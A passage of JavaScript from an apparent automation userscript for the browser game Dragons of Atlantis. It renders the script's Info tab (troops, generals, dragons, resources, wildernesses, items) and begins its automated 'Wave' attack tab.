		keys.shuffle();
	}
	
	for ( var i=0; i < keys.length; i++ )
	{
		var general = Seed.generals[ keys[i] ];
		if ( !general.busy )
		{
			return general;
		}
	}
	return null;
}

function getJobs ( queue_type, city_idx )
{
	// in case the city is not been defined in Seed.updateCity return empty array. (by Lord Mimir)
	if ( !Seed.cities[city_idx || 0] ) return [];

	var city_id = Seed.cities[ (city_idx || 0) ].id;
	var jobs = Seed.jobs[city_id];
	var queue = [];
	
	var jobs_id = getKeys ( jobs );
	for ( var i = 0; i < jobs_id.length; i++ )
	{
		var id = jobs_id[ i ];
		if ( jobs[ id ].queue == queue_type ) {
			queue.push( jobs[ id ] );
		}
	}

	return queue;
}


//******************************** Info Tab *****************************
Tabs.Info = {
	tab_order	: INFO_TAB_ORDER,
	tab_label	: 'Info',
	tab_disabled: !INFO_TAB_ENABLE,

	last_tab_id		: 'tabTroops',
	
	flash_html : null,
	
	$container	: null,
	timer		: null,
	show_flash  : true,
	show_fulscreen  : false,
	
	units_type	: Units.all_units_type,
	
	resources_type  : Resources.resources_type,
	
	init : function ( div )
	{
		var t = Tabs.Info;
		t.$container = $J( div );
		
		var city = Seed.cities[0];
		
		var html = 
		 '<div id=' + setUID('Tabs.Info.title') + ' class=' + UID['title'] + '>' + translate('Info') + ' </div>'
		+'<table width=100%>'
		+'	<tr>'
		+'		<td>'
		+'			<input style="width:100px;" type=button value="'+translate('Refresh')+'" id=' + setUID('Tabs.Info.refresh') + ' />'
		+'			<input style="margin-left:5px;width:100px;" class="'+UID[t.show_flash ? 'btn_on' : 'btn_off']+ '" type=button value="'+translate('Toggle Flash')+'" id=' + setUID('Tabs.Info.toggleflash') + ' />'
		+'			<input style="margin-left:5px;width:100px;" type=button value="'+translate('Reload Flash')+'" id=' + setUID('Tabs.Info.reloadflash') + ' />'
		+'			<input style="margin-left:5px;width:100px;" class="'+UID[t.show_fulscreen ? 'btn_on' : 'btn_off']+ '" type=button value="'+translate('Fullscreen')+'" id=' + setUID('Tabs.Info.fullScreen') + ' />'
		+'		</td>'
		+'	</tr>'
		+'</table>' 
		+'<div class='+ UID['subtitle']+'>'
		+'<table width=100%>'
		+'	<tr>'
		+'		<td style="text-align:left;padding-left:5px;">'
		+			  (( Seed.player.alliance ) ? Seed.player.alliance.name : '' )
		+'		</td>'
		+'		<td width=50% style="text-align:center;">'
		+'			<font color=yellow>' + city.name + '</font>'
		+'		</td>'
		+'		<td style="text-align:right;padding-right:5px;">'
		+'			<input marginLeft=5px class="'+UID[ (Seed.cities[0].defended ? 'btn_off' : 'btn_on') ]+ '" type=button value="'+translate(Seed.cities[0].defended?'Defend':'Hiding').toUpperCase()+'" id=' + setUID('Tabs.Info.changewall') + ' />'
		+'		</td>'
		+'	</tr>'
		+'</table>'
		+'</div>'
		+'<ul class=tabs>'
		+'	<li class="tab first"><a id=' + setUID('Tabs.Info.tabTroops')  + '>' + translate('Troops')     + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Info.tabGenerals') + '>' + translate('Generals')    + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Info.tabDragons') + '>' + translate('Dragons')    + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Info.tabResources') + '>' + translate('Resources')    + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Info.tabItems') + '>' + translate('Items')    + '</a></li>'
		+'</ul>'
		+'<div id=' + setUID('Tabs.Info.content') + '></div>';
    
		$J( t.$container ).html( html );
    
		$J('#'+UID['Tabs.Info.content'])
		.css({
			  height		: '650px'
		})
		.addClass('no-overflow');

		$J('#'+UID['Tabs.Info.refresh'])
		.click ( refresh );

		$J('#'+UID['Tabs.Info.toggleflash'])
		.click ( toggleFlash );

		$J('#'+UID['Tabs.Info.reloadflash'])
		.click ( reloadFlash );

		$J('#'+UID['Tabs.Info.fullScreen'])
		.click ( toggleFulscreen );

		$J('#'+UID['Tabs.Info.changewall'])
		.click ( changeWall );
		
		$J( '#'+UID['Tabs.Info.tabTroops']  ).click ( {current_tab:0}, t.showSubTab);
		$J( '#'+UID['Tabs.Info.tabResources'] ).click ( {current_tab:1}, t.showSubTab);
		$J( '#'+UID['Tabs.Info.tabDragons'] ).click ( {current_tab:2}, t.showSubTab);
		$J( '#'+UID['Tabs.Info.tabGenerals']  ).click ( {current_tab:3}, t.showSubTab);
		$J( '#'+UID['Tabs.Info.tabItems']  ).click ( {current_tab:4}, t.showSubTab);
		
		t.flash_html = $J('#container').html();
		//console.log('flash='+flash_html);

		function refresh ()
		{
			var t = Tabs.Info;
			
			//debugLog('fetchPlayer from Tabs.Info refresh');
			
			var msg = $J.msg({ 
				content 	 : translate('Refresh') + '...',
				target		 : t.$container,
				clickUnblock : false,
				timeOut 	 : 6000
				
			});
			
			Seed.fetchPlayer ({
				cities    : [Seed.cities[0].id],
				callback  : function() {
					Tabs.Info.showSubTab({data:{ current_tab: Data.options.info.current_tab }});
				},
				delay     : 250,
				caller    : 'Tabs.Info.refresh'
			});
		}
		
		function toggleFulscreen ( event )
		{
			t.show_fulscreen = !t.show_fulscreen;
			event.target.className = UID[ t.show_fulscreen ? 'btn_on' : 'btn_off'];
			swf_width = t.show_fulscreen ? '99%':'760px';
			$J('#container').css({width:swf_width}) ;
			$J('#castlemania_swf').css({width:swf_width}) ;
			$J('#castlemania_swf_container').css({width:swf_width}) ;
		}

		function toggleFlash ( event )
		{
			t.show_flash = !t.show_flash;
			event.target.className = UID[ t.show_flash ? 'btn_on' : 'btn_off'];
			//$J('#container').toggle();
			// Didi : turn off music
			if ( t.show_flash && Data.options.sound.disable_music) {
				Sound.TurnOff(15);
			}
			if ( t.flash_html ) {
				if ( t.show_flash ) {
					$J('#container').html(t.flash_html);
				} else { 
					$J('#container').empty();
				}
			}
		}
		
		function reloadFlash ( event )
		{
			if ( t.flash_html ) {
				if ( t.show_flash ) {
					//$J('#container').toggle().toggle();
					$J('#container').empty().html(t.flash_html);
				} else {
					//$J('#container').toggle();
					$J('#container').html(t.flash_html);
					t.show_flash = !t.show_flash;
					$J('#'+UID['Tabs.Info.toggleflash']).removeClass(UID['btn_off']);
					$J('#'+UID['Tabs.Info.toggleflash']).addClass(UID['btn_on']);
				}
			}
			if ( Data.options.sound.disable_music) {
				Sound.TurnOff(15);
			}
		}

		function changeWall (event)
		{
			var button = event.target;
			button.disabled = true;
			new MyAjax.defendedCity({
				city_id   : Seed.cities[0].id,
				defended  : !Seed.cities[0].defended,
				onSuccess : function (){
					// Change again when recibe the real state from cityUpdate
					button.disabled = false;
					button.className = UID[ (Seed.cities[0].defended ? 'btn_off' : 'btn_on') ];
					button.value = translate( Seed.cities[0].defended ? 'Defend' : 'Hiding' ).toUpperCase();
				},
				onFailure : function() { 
					var state = Seed.cities[0].defended;
					button.disabled = false;
					button.className = UID[ (state ? 'btn_off' : 'btn_on') ];
					button.value = translate( state ? 'Defend' : 'Hiding' ).toUpperCase();
				},
				delay     : 500,
				caller    : 'Tabs.Info.changeWall'
			});
		}
		
		
		t.showSubTab({data:{ current_tab: Data.options.info.current_tab }});
	},

	show : function (){
		var t = Tabs.Info;

		t.showSubTab({data:{ current_tab: Data.options.info.current_tab }});
	},
	
	hide : function (){
		var t = Tabs.Info;
		clearInterval ( t.timer ); t.timer=null;
	},

	showSubTab : function(event)
	{
		var t = Tabs.Info;
		
		var current_tab = event.data.current_tab;
		
		Data.options.info.current_tab = current_tab;

		//Didi : update Defense bouton
		if (!$J('#'+UID['Tabs.Info.changewall']).is(':disabled')) {
			var state = Seed.cities[0].defended;
			$J('#'+UID['Tabs.Info.changewall'])
			.attr('class', UID[ (state ? 'btn_off' : 'btn_on') ])
			.attr('value', translate( state ? 'Defend' : 'Hiding' ).toUpperCase());
		}
		
		clearInterval ( t.timer ); t.timer=null;

		var tab_name;
		switch ( current_tab )
		{
		case 0: tab_name='tabTroops'  ; break;
		case 1: tab_name='tabResources' ; break;
		case 2: tab_name='tabDragons' ; break;
		case 3: tab_name='tabGenerals' ; break;
		case 4: tab_name='tabItems' ; break;
		}
		
		$J('#'+UID[t.last_tab_id])
		.css('z-index', '0')
		.removeClass('selected');
		
		$J('#'+UID['Tabs.Info.' + tab_name])
		.css('z-index', '1')
		.addClass('selected');
		
		t.last_tab_id = 'Tabs.Info.' + tab_name;

		t[tab_name] ();

		if (tab_name != 'tabItems') {
			t.timer = setInterval ( function () { t.showSubTab({data:{ current_tab: Data.options.info.current_tab }}) }, 1000 );
		} else {
			t.timer = setInterval ( function () { t.showSubTab({data:{ current_tab: Data.options.info.current_tab }}) }, 60000 );
		}

	},

	tabTroops : function (){
		var t = Tabs.Info;
		
		var now = parseInt( serverTime() );

		var city = Seed.cities[0];
		
		var html = '';

		// Armed Forces & Generals
		html += 
		 '<table class=' + UID['table'] + ' style="width:100%;margin-top:3px;">'
		+'	<tr>'
		+'		<th>' 
		+'			<span class="' + UID['doa-icons'] + ' i-Troops" ></span>'
		+ 			translate('Army') 
		+'		</th>'
		+'	</tr>'
		+'	<tr valign=top align=left>'
		+'		<td width=100% align=center>';
		
		// Units
		html += '<table class="' + UID['table'] + ' zebra" style="width:100%;">'
		+'				<tr>'
		+'					<th width=30% style="text-align:center !important;" rowspan=2>' + translate('Troops') + '</th>'
		+'					<th width=40% style="text-align:center !important;" colspan=4>' +	translate('Ready') + '</th>'
		+'					<th width=30% style="text-align:center !important;" colspan=3>' +	translate('Current') + '</th>'
		+'				</tr>'
		+'				<tr>'
		+'					<th width=10%>' + translate('In city').substring(0,7) + '</th>'
		+'					<th width=10%>' + translate('March').substring(0,7) + '</th>'
		+'					<th width=10%>' + translate('Defense').substring(0,7) + '</th>'
		+'					<th width=10%>' + translate('Total').substring(0,7) + '</th>'
		+'					<th width=10%>' + translate('Training').substring(0,7) + '</th>'
		+'					<th width=10%>' + translate('Resurrection').substring(0,7) + '</th>'
		+'					<th width=10%>' + translate('Souls').substring(0,7) + '</th>'
		+'				</tr>';
		
		for ( var i=0; i < t.units_type.length; i++ )
		{
			var num_units = Units.getUnitNumbers( city, t.units_type[i] );
			
			html +=
			 '			<tr>'
			+'				<td align=left>' 
			+'					<span class="' + UID['doa-icons'] + ' i-' + t.units_type[i] + '" ></span>'
			+						translate(t.units_type[i])
			+'				</td>'
			+'				<td align=right class=jewel>' + num_units.incity + '</td>'
			+'				<td align=right class=jewel>' + (num_units.marches ? '<b>' + num_units.marches + '</b>' : '') + '</td>'
			+'				<td align=right class=jewel>' + (num_units.indefense ? '<b>' + num_units.indefense + '</b>' : '') + '</td>'
			+'				<td align=right class=jewel>' + num_units.total + '</td>'
			+'				<td align=right class=jewel>' + (num_units.intraining ? '<b>(+' + num_units.intraining + ')</b>' : '') + '</td>'
			+'				<td align=right class=jewel>' + (num_units.inresurrection ? '<b>(+' + num_units.inresurrection + ')</b>' : '') + '</td>'
			+'				<td align=right class=jewel>' + (num_units.souls ? '<b>' + num_units.souls + '</b>' : '') + '</td>'
			+'			</tr>';
		}
		
		html +=
		 '			</table>'
		+'		</td>'
		+'	</tr>'
		+'</table>';
				
		// Units
		$J('#'+UID['Tabs.Info.content']).html( html );

	},

	tabGenerals : function (){
		var t = Tabs.Info;
		
		var now = parseInt( serverTime() );

		var city = Seed.cities[0];
		
		var html = '';

		// Generals
		html += 
		 '<table class=' + UID['table'] + ' style="width:100%;margin-top:3px;">'
		+'	<tr>'
		+'		<th>' 
		+'			<span class="' + UID['doa-icons'] + ' i-Generals" ></span>'
		+ 			translate('My Generals') 
		+'		</th>'
		+'	</tr>'
		+'	<tr valign=top align=left>'
		+'		<td width=75% align=center style="padding-left:7px">';
		
		html +=
		 '			<table class=' + UID['table'] + ' style="width:75%;">'
		+'			<tr>'
		+'				<td align=right>' + translate('Marching') + ': </td>'
		+'				<td>' + Seed.total.marches + '</td>'
		+'			</tr>'
		+'			</table>';
		
		// Generals
		html += 
		 '			<table class="' + UID['table'] + ' zebra" style="width:75%;">'
		+'				<tr>'
		+'					<th style="text-align:right !important;">' 
		+ 						translate('Name') 
		+'						<span style="font-family:Wingdings;">&nbsp;«</span>'
		+'					</th>'
		+'					<th>' + translate('Victory') + '</th>'
		+'					<th width=35%>' + translate('Coordinates') + '</th>'
		+'				</tr>';
		
		
		
		for ( var i=0; i < city.generals.length; i++ )
		{
			var general_xy='';
			var general=Seed.generals[ city.generals[i].id ];
			
			var x = (general.x || 0);
			var y = (general.y || 0);
			
			if ( !city.generals[i].status || general.status !== 'retreating' ) {
				general_xy = x + '/' + y;
			} else {
				general_xy = translate('Capital').toLowerCase();
			}
			
			
			html +=
			 '			<tr>'
			+'				<td align=right>'
			+'					<span>' + city.generals[i].name.substring(0,25) + '</span>'
			+' 					<span class=jewel>(' + city.generals[i].rank + ')</span>'
			+'				</td>'
			+'				<td align=right>'
			+'					<span class=jewel style="color:#000;">' + city.generals[i].victories + '</span>'
			+'				</td>'
			+'				<td width=35%>'
			+           (city.generals[i].busy ? 
										'<span class="' + UID['doa-icons'] + ' i-' + general.status + '" ></span>' 
			 							+ '<span class=jewel>'+ '[' + general_xy + ']' + '</span>' 
			 						: '' ) 
			+'				</td>'
			+'			</tr>';
		}
		
		html +=
		 '			</table>';
		 
		 
		html +=
		 '		</td>'
		+'	</tr>'
		+'</table>';
				
		// Marches
		$J('#'+UID['Tabs.Info.content']).html( html );
	
	},	
	
	tabDragons : function (){
		var t = Tabs.Info;
		
		var now = parseInt( serverTime() );

		var city = Seed.cities[0];
		
		var html = '';
		
		html += 
		 '<table class=' + UID['table'] + ' style="width:100%;margin-top:3px;">'
		+'	<tr>'
		+'		<th>' 
		+'			<span class="' + UID['doa-icons'] + ' i-GreatDragon" ></span>'
		+ 			translate('Dragon') 
		+'		</th>'
		+'	</tr>'
		+'	<tr valign=top align=left>'
		+'		<td width=100%>';

		html +=
		 '			<table class="' + UID['table'] + ' zebra" >'
		+'				<tr>'
		+'					<th width=30%>'	+ translate('Name')	+ '</th>'
		+'					<th>' + translate('Status') + '</th>'
		+'					<th width=20%>' + translate('Coordinates').substring(0,5) + '</th>'
		+'				</tr>';

		var dragons_list = getKeys(Dragons.all_dragons);
		dragons_list.sort(function(a,b){return Dragons.all_dragons[a].index - Dragons.all_dragons[b].index;});
		var bt_id = [];
		var check_id = [];
		var cure_id = [];
		for ( var i = 0; i < dragons_list.length ; i++)
		{
			var dragon = Dragons.all_dragons[ dragons_list[i] ];
			
			if ( !dragon ) continue;
			
			var dragon_xy,dragon_status,dragon_status_title;
			var x = (dragon.x || 0);
			var y = (dragon.y || 0);
			
			if ( !dragon.status || dragon.status !== 'retreating' ) {
				dragon_xy = x + '/' + y;
			} else {
				dragon_xy = translate('Capital').toLowerCase();
			}
			
			dragon_status = '';
			dragon_status_title = null;

			if ( !dragon.can_attack ) {
				if ( dragon.reqs && dragon.reqs.msg ) {
					dragon_status = dragon.reqs.imsg;
					dragon_status_title = dragon.reqs.msg;
				}
				else if ( !dragon.summoned ) {
					dragon_status_title = translate ('Not')+ ' ' + translate('Summoned');
					dragon_status = 
						 ' <span class="' + UID['doa-icons'] + ' i-UnsummonedSpectralDragon"></span>';
					if ( !dragon.summon_inProgress ) {
						dragon_status += '&nbsp;'
							+'<input id='+ setUID('Tabs.Info.tabDragons.Summon_'+ dragon.name ) +' ref='+ dragon.name +' type=button class="'+UID['btn_on']+' thin" value="'+translate('Summon')+'" />' ;
						bt_id.push(UID['Tabs.Info.tabDragons.Summon_'+ dragon.name]);
					}						
				} 
			} else {
				if (Data.options.cheat.dragon_healing && dragon.name !== 'SpectralDragon' ) {
					dragon_status += translate('AutoCure')+ '<input id=' + setUID('Tabs.Info.tabDragons.AutoCure_'+ dragon.name) + ' ref='+ dragon.name + ' type=checkbox ' + (Data.options.cheat.heal_dragon[dragon.name]?'CHECKED':'') + ' />&nbsp;';
					check_id.push(UID['Tabs.Info.tabDragons.AutoCure_'+ dragon.name]);
				}
				if ( dragon.life == dragon.maximum_life ) {
					dragon_status += '<span class="' + UID['doa-icons'] + ' i-life" ></span>'
					if ( dragon.reqs && dragon.reqs.msg ) {
						dragon_status += '&nbsp;('+dragon.reqs.imsg+' )';
						dragon_status_title = dragon.reqs.msg;
					}
				} else {
					dragon_status += '<span class="' + UID['doa-icons'] + ' i-Medicine" ></span>'
					var time_left = dragon.heal_at - now;
					var time_format;
					if ( time_left < 0 )
					{
						time_format = '...';
					} 
					else if ( isNaN( time_left ) ){
						time_format = '---';
					}
					else {
						if ( dragon.life >= dragon.life_required_to_march ) {
							time_format = timeFormat( time_left, true );
						} else { 
							time_format = timeFormat( time_left, true , 'tfr' );
						}
					}
					dragon_status += time_format;
				}
				if (Data.options.cheat.dragon_healing && dragon.name !== 'SpectralDragon' ) {
					if ( dragon.life < dragon.life_required_to_march ) {
						dragon_status += '<input id='+ setUID('Tabs.Info.tabDragons.Cure_'+ dragon.name ) +' ref='+ dragon.name +' type=button class="'+UID['btn_on']+' thin" value="'+translate('Cure')+'" />' ;
						cure_id.push(UID['Tabs.Info.tabDragons.Cure_'+ dragon.name]);
					}
				}
			}

			html +=
			 '			<tr>' 
			+'				<td align=left width=30% >'
			+'					<span class="' + UID['doa-icons'] + ' i-' + dragon.name + '" ></span>'
			+'					<span>' + translate(dragon.name) + '</span>'
			+'				</td>'
			+'				<td align=left style="white-space:normal;"'
			+						( dragon_status_title ? ' title="'+ dragon_status_title.replace(/\+/g,' \n') +'"': '')
			+            						'>'
			+						dragon_status
			+'				</td>'
			+'				<td width=20%>' 
			+ 					(!dragon.is_in_city ? 
										'<span class="' + UID['doa-icons'] + ' i-' + dragon.status + '" ></span>' 
			 							+ '<span class=jewel>'+ '[' + dragon_xy + ']' + '</span>' 
			 						: '' ) 
			+'				</td>'
			+'			</tr>';
		}

		html +=
		 '			</table>';
		 
		 
		html +=
		 '		</td>'
		+'	</tr>'
		+'</table>';

		// Marches, building, research, training
		$J('#'+UID['Tabs.Info.content']).html( html );

		// Didi : Add event listeners for summon dragon
		for ( var i=0; i < bt_id.length; i++ ) 
		{
			$J('#'+bt_id[i]).click( function(event) {
				var self = event.target;
						
				self.disabled = true;
				self.style.display = 'none';
						
				// Take the march id from the "ref" attribute
				var dragon_name = self.getAttribute( 'ref' );
				
				var dragon = Dragons.all_dragons[ dragon_name ];
						
				// Verify that the march really exists in Seed.marches
				if ( dragon )
				{
					var city_id = dragon.city_id;
					dragon.summon_inProgress = true;
					MyAjax.summon({
						city_id   : city_id,
								
						onSuccess : function ( r ) {
							dragon.summoned = true;
							dragon.life = dragon.maximum_life;
							dragon.summon_inProgress = false;
						},
								
						onFailure : function ( r ) {
							dragon.summon_inProgress = false;
						},
						
						caller    : 'Tabs.Info.tabDragons'
						});
				}
			});
		}

		// Didi : Add event listeners for auto cure dragon
		for ( var i=0; i < check_id.length; i++ ) 
		{
			$J('#'+check_id[i]).change( function(event) {
				var self = event.target;
						
				// Take the march id from the "ref" attribute
				var dragon_name = self.getAttribute( 'ref' );
				
				var dragon = Dragons.all_dragons[ dragon_name ];
						
				// Verify that the march really exists in Seed.marches
				if ( dragon )
				{
					Data.options.cheat.heal_dragon[dragon_name]=self.checked;
				}
			});
		}

		// Didi : Add event listeners for cure dragon
		for ( var i=0; i < cure_id.length; i++ ) 
		{
			$J('#'+cure_id[i]).click( function(event) {
				var self = event.target;
						
				self.disabled = true;
				self.style.display = 'none';
						
				// Take the march id from the "ref" attribute
				var dragon_name = self.getAttribute( 'ref' );
				
				var dragon = Dragons.all_dragons[ dragon_name ];
						
				// Verify that the march really exists in Seed.marches
				if ( dragon )
				{
					var city_idx = dragon.index;
					Dragons.Cure(city_idx);
				}
			});
		}

	},
	
	tabResources : function (){
		var t = Tabs.Info;
		
		var city = Seed.cities[0];
		
		var html = '';

		 // Polulation
		html += 
		 '<table class="' + UID['table'] + ' zebra" style="margin-top:3px" width=100%>'
		+'	<tr>'
		+'		<th>' + translate('Population') + '</th>'
		+'		<th>' + translate('Laborers') + '</th>'
		+'		<th>' + translate('Army') + '</th>'
		+'		<th>' + translate('IdlePopulation').replace( translate('Population'), '' ) + '</th>'
		+'		<th>' + translate('Capacity') + '</th>'
		+'	</tr>'
		+'	<tr valign=top>'
		+'		<td>'
		+'			<span class="' + UID['doa-icons'] + ' i-population" style="position:absolute;"></span>'
		+' 			<span class="jewel" style="display:inline-block;width:99%;text-align:right;">' 
		+ 				parseInt ( city.figures.population.current ).intToCommas() 
		+'			</span>'
		+'		</td>'
		+'		<td align=right class=jewel>'
		+ 			parseInt ( city.figures.population.laborers ).intToCommas()
		+'		</td>'
		+'		<td align=right class=jewel>'
		+ 			parseInt ( city.figures.population.armed_forces ).intToCommas()
		+'		</td>'
		+'		<td align=right class=jewel style="color:#333 !important">'
		+ 			parseInt ( city.figures.population.current - city.figures.population.laborers - city.figures.population.armed_forces ).intToCommas()
		+'		</td>'
		+'		<td align=right class=jewel>'
		+ 			parseInt ( city.figures.population.limit ).intToCommas()
		+'		</td>'
		+'	</tr>'
		+'</table>';
		
		
		
		// Resources
		html += 
		 '<table class="' + UID['table'] + ' zebra" style="margin-top:3px" width=100%>'
		+'	<tr>'
		+'		<th>' + translate('Type') + '</th>'
		+'		<th>' + translate('Reserves') + '</th>'
		+'		<th>' + translate('Per Hour') + '</th>'
		+'		<th>' + translate('Consumption') + '</th>'
		+'		<th>' + translate('Capacity') + '</th>'
		+'	</tr>';
		
		for ( var idx=0; idx < t.resources_type.length; idx++ )
		{
			var type = t.resources_type[idx];
			var production = Resources.rates[ type ];
			
			// if we don't have blue_energy yet
			if ( !production.rate ) continue;
			
			html += 
			 '	<tr valign=top>'
			+'		<td>'
			+'			<span class="' + UID['doa-icons'] + ' i-' + type + '" ></span>'
			+			 translate ( type.replace(/_/,' ') )
			+'		</td>'
			+'		<td align=right class=jewel style="color:#333 !important">'
			+ 			parseInt ( city.resources[type] ).intToCommas()
			+'		</td>'
			+'		<td align=right class=jewel>'
			+ 			production.rate.intToCommas()
			+'		</td>'
			+'		<td align=right class=jewel>'
			+ 			(production.unit_consumption || production.general_salaries || 0).intToCommas()
			+'		</td>'
			+'		<td align=right class=jewel>'
			+ 			( production.capacity === 1E+18 ? translate('Unlimited') : production.capacity.intToCommas() )
			+'		</td>'
			+'	</tr>';
		}
		
		html +=
		 '</table>';

		// Wildernesses
		var WildernessArray = CptWildernesses();
		html +=
		'<table class="' + UID['table'] + ' zebra" style="margin-top:3px" width=100%>'
		+'	<tr>'
		+'		<th colspan=5>' + translate('Wildernesses') +'&nbsp;:&nbsp;'+Seed.player.player_wildernesses.length+'/'+Seed.player.max_wildernesses+ '</th>'
		+'	</tr>'
		+'	<tr valign=top align=left>'
		+'		<td width=50% style="border-right: 1px solid;">';
		html += '<table class="' + UID['table'] + ' zebra" style="width:100%;">';

		for ( var i=0; i < WildernessArray.length; i+=2 )
		{
			var wType=WildernessArray[i].type;
			
			html +=
			 '	<tr>'
			+'		<td align=left>' 
			+'      <span class="' + UID['doa-icons'] + ' i-' + wType + '"></span>'
			+			translate(wType)
			+ '		</td>'
			+'		<td align=left>' 
			+'Level&nbsp;'
			+ (WildernessArray[i].MinLvl === WildernessArray[i].MaxLvl ? WildernessArray[i].MinLvl : WildernessArray[i].MinLvl + '-' +WildernessArray[i].MaxLvl)
			+ '		</td>'
			+'		<td align=left class=jewel>' + WildernessArray[i].Number + '</td>'
			+'	</tr>';
		}

		html +=
		 '			</table>'
		+'		</td>'
		+'		<td width=50% align=center style="padding-left:7px">';

		html += '<table class="' + UID['table'] + ' zebra" style="width:100%;">';

		for ( var i=1; i < WildernessArray.length; i+=2 )
		{
			var wType=WildernessArray[i].type;
			
			html +=
			 '	<tr>'
			+'		<td align=left>' 
			+'      <span class="' + UID['doa-icons'] + ' i-' + wType + '"></span>'
			+			translate(wType)
			+ '		</td>'
			+'		<td align=left>' 
			+'Level&nbsp;'
			+ (WildernessArray[i].MinLvl === WildernessArray[i].MaxLvl ? WildernessArray[i].MinLvl : WildernessArray[i].MinLvl + '-' +WildernessArray[i].MaxLvl)
			+ '		</td>'
			+'		<td align=left class=jewel>' + WildernessArray[i].Number + '</td>'
			+'	</tr>';
		}

		html +=
		 '			</table>'
		+'		</td>';

		html += '	</tr>'
    +'</table>';
		 
		// Marches, building, research, training
		$J('#'+UID['Tabs.Info.content']).html( html );
		
		//Didi modif : compta wildernesses
    function CptWildernesses (){
      var pWildernesses = Seed.player.player_wildernesses;
      var	 WindernessType = [] ;
      
      for (var i = 0; i<pWildernesses.length;i++) {
      	var trv = false;
      	for (var j = 0; j<WindernessType.length && trv==false;j++){
      		if (pWildernesses[i].type == WindernessType[j].type) {
      			WindernessType[j].Number++;
      			if (WindernessType[j].MinLvl > pWildernesses[i].level) {
      				WindernessType[j].MinLvl = pWildernesses[i].level
      			}
      			if (WindernessType[j].MaxLvl < pWildernesses[i].level) {
      				WindernessType[j].MaxLvl = pWildernesses[i].level
      			}
      			trv = true;
      		}
      	}
      	if (!trv) {
      		var d= {type:pWildernesses[i].type,Number:1,MinLvl:pWildernesses[i].level,MaxLvl:pWildernesses[i].level};
      		WindernessType.push(d);
      	}
      }
      
      return WindernessType;
    }

	},

	tabItems : function (){
		var t = Tabs.Info;
		
		var city = Seed.cities[0];
		
		var html = 
		'<div style="height:650px;width:500px;overflow:auto !important;">';

		// Wham 
		// Show  Items
		for (var j = 0 ; j < Items.category_items.length ; j++ ) {
			var item_type=Items.category_items[j];
			var all_items_type = Items.all_items[item_type].cloneProps();
    	
			all_items_type = $J.grep(all_items_type, function(e){ 
				var shown = true;
				if (e.hide_if) {
					var hide_if = e.hide_if;
					var reverse = hide_if.charAt(0) == "!";
					for ( var k = 0; k < Seed.cities.length ; k++ ) 
					{
						if (!Seed.cities[k]) continue;
						if (hide_if.indexOf(CITY_TYPE[k]) > -1) {
							if (reverse) {
								shown = true;
							} else {
								shown = false;
							}
						}
					}
				}
				return shown && Items.getItem(e.type) > 0 ; 
			});
			
			if ( all_items_type.length == 0) continue;
			
			html +=
			 '	<table class="' + UID['table'] + ' zebra" style="margin-top:3px" width=100%>'
			+'		<tr>'
			+'			<th colspan=2>' + translate(item_type) + '</th>'
			+'		</tr>'
			+'		<tr valign=top align=left>'
			+'			<td width=50% style="border-right: 1px solid;">';
			
			html += '	<table class="' + UID['table'] + ' zebra" style="width:100%;">';
    	
			for ( var i = 0; i < all_items_type.length; i+=2)
			{
				html +=
				 '				<tr>'
				+'					<td>'
				+'				    <span class="' + UID[ 'doa-icons' ] + ' i-' + all_items_type[i].type + '"></span>'
				+					 translate( all_items_type[i].type ).substring (0,25)
				+'					</td>'
				+'					<td align=right class=jewel>' + Items.getItem(all_items_type[i].type) +'</td>'
				+'				</tr>';
			}
    	
			html +=
			 '				</table>'
			+'			</td>'
			+'			<td width=50% align=center style="padding-left:7px">';
			
			html += '	<table class="' + UID['table'] + ' zebra" style="width:100%;">';
    	
			for ( var i = 1; i < all_items_type.length; i+=2)
			{
				html +=
				 '				<tr>'
				+'					<td>'
				+'				    <span class="' + UID[ 'doa-icons' ] + ' i-' + all_items_type[i].type + '"></span>'
				+					 translate( all_items_type[i].type ).substring (0,25)
				+'					</td>'
				+'					<td align=right class=jewel>' + Items.getItem(all_items_type[i].type) +'</td>'
				+'				</tr>';
			}
    	
			html +=
			 '				</table>'
			+'			</td>'
			+'		</tr>';
    	
			html += 
					'</table>';
		}

		html += 
			'</div>';

		$J('#'+UID['Tabs.Info.content']).html( html );
		
	},

	
} // END Tabs.Info


//******************************** Waves Tab *****************************
Tabs.Waves = {
	tab_order		: WAVE_TAB_ORDER,
	tab_label		: 'Wave',
	tab_disabled	: !WAVE_TAB_ENABLE,
	
	last_tab_id		: 'tabTargets',
	
	$container		: null,
	$content		: null,
	
	units_type		: Units.waves_units_type,

	timer			: { 
		 attack			: null
		,marches		: null
		,tick   		: null
	},

	running			: {
		 start_at		: 0
		,attacks		: 1
		,errors			: 0
	},

	init : function (div)
	{
		var t = Tabs.Waves;
	
		t.$container = $J(div);
		
		var html = 
		 '<div id=' + setUID('Tabs.Waves.title') + ' class=' + UID['title'] + '>' + translate('Wave') + ' </div>'
		+'<div id='+ setUID('Tabs.Waves.status') + ' class=' + UID['status_ticker'] + ' style="margin-bottom:5px !important">'
		+'	<center>'
		+'		<input type=button value="OnOff" id=' + setUID('Tabs.Waves.enabled') + ' />'
		+'	</center>'
		+'	<div class=' + UID['status_report'] + ' style="height:140px;max-height:140px;">'
		+'		<table id=' + setUID('Tabs.Waves.marches') + ' class="' + UID['table'] + ' zebra" style="width:474px;max-width:474px;">'
		+'		</table>'
		+'	</div>'
		+'	<div id=' + setUID('Tabs.Waves.feedback') + ' class=' + UID['status_feedback'] + '></div>'
		+'</div>'
		+'<ul class=tabs>'
		+'	<li class="tab first"><a id=' + setUID('Tabs.Waves.tabTargets')     + '>'  + translate('Targets')    + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Waves.tabStats')       + '>'  + translate('Statistics') + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Waves.tabOptions')     + '>'  + translate('Options')    + '</a></li>'
		+'</ul>'
		+'<div id=' + setUID('Tabs.Waves.content') + ' style="padding-top:1px; height:460px;"></div>';
		
		t.$container.html( html );
		
		t.$content = $J('#'+UID['Tabs.Waves.content']);
		
		// Add the event listeners
		$J('#'+UID['Tabs.Waves.enabled']).click (function (){
			t.setWaveEnable( !Data.options.waves.enabled );
		});
		
		$J( '#'+UID['Tabs.Waves.tabTargets'] ).click ( {current_tab:0}, t.showSubTab );
		$J( '#'+UID['Tabs.Waves.tabStats']   ).click ( {current_tab:1}, t.showSubTab );
		$J( '#'+UID['Tabs.Waves.tabOptions'] ).click ( {current_tab:2}, t.showSubTab );
		
